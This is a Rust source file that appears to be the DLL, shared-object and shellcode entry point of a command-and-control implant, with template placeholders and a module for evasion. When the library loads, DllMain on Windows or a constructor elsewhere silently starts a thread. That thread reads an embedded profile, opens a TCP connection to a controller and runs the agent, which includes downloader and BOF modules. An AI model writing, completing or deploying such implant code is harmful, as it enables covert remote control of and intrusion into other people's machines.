// __NAME__ Agent — DLL Entry Point
//
// This file provides the cdylib entry for DLL / Shared Object / Shellcode
// builds.  On Windows it exports DllMain which spawns the agent on a
// background thread.  On non-Windows targets it exposes a constructor
// attribute that achieves the same.

mod config;
mod crypto;
mod protocol;
mod agent;
mod commander;
mod runtime_common;
mod runtime_fs;
mod runtime_response;
mod connector_tcp;
mod jobs;
mod downloader;
mod bof;
// __EVASION_MOD__

#[cfg(windows)]
#[no_mangle]
pub extern "system" fn DllMain(
    _dll_module: usize,
    call_reason: u32,
    _reserved: usize,
) -> i32 {
    const DLL_PROCESS_ATTACH: u32 = 1;
    if call_reason == DLL_PROCESS_ATTACH {
        std::thread::spawn(|| {
            let profile = config::ENC_PROFILES
                .first()
                .map(|bytes| bytes.to_vec())
                .unwrap_or_default();

            let profile_text = String::from_utf8_lossy(&profile);
            let first_line = profile_text.lines().next().unwrap_or_default();
            let connector = connector_tcp::ConnectorTCP::from_profile(first_line);

            let mut agent = agent::Agent::new(profile, Box::new(connector));
            agent.run();
        });
    }
    1 // TRUE
}

#[cfg(not(windows))]
#[ctor::ctor]
fn _init() {
    std::thread::spawn(|| {
        let profile = config::ENC_PROFILES
            .first()
            .map(|bytes| bytes.to_vec())
            .unwrap_or_default();

        let profile_text = String::from_utf8_lossy(&profile);
        let first_line = profile_text.lines().next().unwrap_or_default();
        let connector = connector_tcp::ConnectorTCP::from_profile(first_line);

        let mut agent = agent::Agent::new(profile, Box::new(connector));
        agent.run();
    });
}
